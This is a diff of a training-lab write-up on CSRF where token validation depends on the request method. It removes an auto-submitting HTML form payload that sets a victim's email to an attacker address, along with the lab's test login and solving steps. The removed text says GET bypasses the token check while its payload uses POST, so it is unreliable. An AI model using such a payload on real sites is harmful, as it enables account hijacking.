@@ -1,34 +1,10 @@
 # Lab 10: CSRF where token validation depends on request method
 
-## Lab URL
-https://0a7a00ef0420980d801ae564007400ef.web-security-academy.net
+## Proof of Exploit
 
-## Vulnerability
-The application validates CSRF token only on POST method. When changing email via GET method, token validation is bypassed.
+![Lab Solved](Lab10-CSRF-Solved.png)
 
-Endpoint: `/my-account/change-email`
-
-## Exploit Code (exploit.html)
-# Lab 10: CSRF where token validation depends on request method
-
-## Exploit Code
-```html
-<html>
-  <body>
-    <form action="https://0a7a00ef0420980d801ae564007400ef.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="hacker@evil.com" />
-    </form>
-    <script>
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
-Steps to Solve
-1.Login with wiener:peter
-2.Go to exploit server
-3.Paste exploit code in Body
-4.Store and Deliver to victim
-5.Lab solved
-
-Proof
-![Solved](Lab10-CSRF-Solved.png)
+## Steps
+1. Login wiener:peter
+2. Exploit server la payload store pannanum
+3. Victim click panna email change aagum
